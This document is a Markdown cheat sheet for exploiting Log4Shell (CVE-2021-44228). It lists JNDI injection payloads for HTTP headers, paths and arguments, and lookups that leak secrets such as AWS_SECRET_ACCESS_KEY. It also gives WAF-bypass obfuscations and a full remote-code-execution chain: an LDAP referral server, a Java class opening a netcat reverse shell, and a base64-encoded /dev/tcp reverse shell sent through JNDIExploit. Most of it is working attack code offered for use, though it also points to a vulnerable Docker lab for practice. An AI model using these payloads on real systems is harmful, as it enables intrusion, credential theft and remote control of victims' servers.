# Log4shell - CVE-2021-44228

- [Log4shell - CVE-2021-44228](#log4shell---cve-2021-44228)
  - [Basic detecting of vulnerable application](#basic-detecting-of-vulnerable-application)
    - [Manuel test](#manuel-test)
    - [Automate test - Local network](#automate-test---local-network)
  - [Information Gathering](#information-gathering)
  - [Bypass WAF](#bypass-waf)
  - [Exploit - RCE](#exploit---rce)
    - [Set Java version](#set-java-version)
    - [LDAP Referral Server](#ldap-referral-server)
    - [Create java payload](#create-java-payload)
    - [Server HTTP](#server-http)
  - [Exploit - RCE with JNDIExploit-1.2-SNAPSHOT](#exploit---rce-with-jndiexploit-12-snapshot)
    - [Listener - LDAP & HTTP](#listener---ldap--http)
    - [Attack](#attack)
  - [Vulnarable docker - log4jpwn](#vulnarable-docker---log4jpwn)
  - [Source](#source)

Patch version of log4j: `2.15.0rc2`

Main Payload:

```
${jndi:ldap://LHOST:LPORT/a}
${jndi:ldaps://LHOST:LPORT/a}
${jndi:rmi://LHOST:LPORT/a}
${jndi:dns://LHOST:LPORT/a}
```


## Basic detecting of vulnerable application

### Manuel test

Inject into `User-Agent`:

```sh
curl TARGET_IP:PORT -H 'User-Agent: ${jndi:ldap://LHOST:LPORT/test}' 
```


Inject into the `Path`:

```sh
curl 'TARGET_IP:PORT/${jndi:ldap://LHOST:LPORT/test}'
```

Inject into `GET` argument:

```sh
curl 'http://TARGET_IP:PORT/a?foo=$\{jndi:ldap://LHOST:1389/test\}'
```

Inject into `POST` argument:

```sh
curl 'http://TARGET_IP:PORT/a' -X POST --data-urlencode '$\{jndi:ldap://LHOST:1389/test\}'
```

Inject into `X-Forwarded-For`:

```sh
curl TARGET_IP:PORT -H 'X-Forwarded-For: ${jndi:ldap://LHOST:LPORT/test}' 
```

### Automate test - Local network
```python
python Log4shell_Local_Scan.py -u http://TARGET_IP:PORT -i INTERFACE
```

## Information Gathering 

Environment var 

```
${sys:os.name}
${sys:os.arch}
${sys:os.version}

${sys:user.name}
${sys:user.home}

${log4j:configParentLocation}

${env:PATH}
${env:HOSTNAME}
${env:AWS_SECRET_ACCESS_KEY}

${java:version}
```

Example:

```sh
curl 'TARGET_IP:PORT/$\{jndi:ldap://LHOST:LPORT/$\{ENV:HOSTNAME\}\}'
```

## Bypass WAF

Payloads


```
${jndi:rmi://LHOST:LPORT/poc}
${${::-j}ndi:rmi://LHOST:LPORT/poc}
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://LHOST:LPORT/poc}
${${lower:jndi}:${lower:rmi}://LHOST:LPORT/poc}
${${lower:${lower:jndi}}:${lower:rmi}://LHOST:LPORT/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://LHOST:LPORT/poc}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://LHOST:LPORT/poc}
```

## Exploit - RCE


1. `${jndi:ldap://LHOST:1389/Resource}` -> reaches out to our LDAP Referral Server
2. LDAP Referral Server springboards the request to a secondary `http://LHOST/resource`
3. The victim retrieves and executes the code present in `http://LHOST/resource`



### Set Java version

```sh
archlinux-java status
sudo archlinux-java set java-8-openjdk
```

###  LDAP Referral Server

Installaton of the server:

```sh
yay maven

git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
mvn clean package -DskipTests
```

Run the LDAP server:

```sh
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://LHOST:8000/#Exploit"
```


### Create java payload

nano Exploit.java

```java
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash LHOST LPORT");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

Build the class:

```sh
javac Exploit.java -source 8 -target 8
```

### Server HTTP 

In the folder where there is the file `Exploit.class` run :

```
python3 -m http.server 8888
```

## Exploit - RCE with JNDIExploit-1.2-SNAPSHOT

### Listener - LDAP & HTTP

Source:

    wget https://github.com/black9/Log4shell_JNDIExploit/raw/main/JNDIExploit.v1.2.zip

Start listening:
```sh
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i LHOST -p 8000
```

### Attack 

Encode reverse shell in base64:
```sh
echo "/bin/bash -c \"/bin/bash -i >& /dev/tcp/LHOST/LPORT 0>&1" &\" | base64
```

Exploit:
```sh
curl TARGET_IP:PORT -H 'User-Agent:${jndi:ldap://LHOST:1389/Basic/Command/Base64/BASE_PAYLOAD}' 
```


## Vulnarable docker - log4jpwn

```sh
git clone https://github.com/leonjza/log4jpwn.git /tmp/log4jpwn
cd /tmp/log4jpwn
docker build -t log4jpwn .
docker run --rm -p8080:8080 log4jpwn
```

## Source 

- https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf
- https://tryhackme.com/room/solar
- https://github.com/Cybereason/Logout4Shell
- https://github.com/christophetd/log4shell-vulnerable-app
- https://github.com/huntresslabs/log4shell-tester
- https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/
- https://threatpost.com/apache-log4j-log4shell-mutations/176962/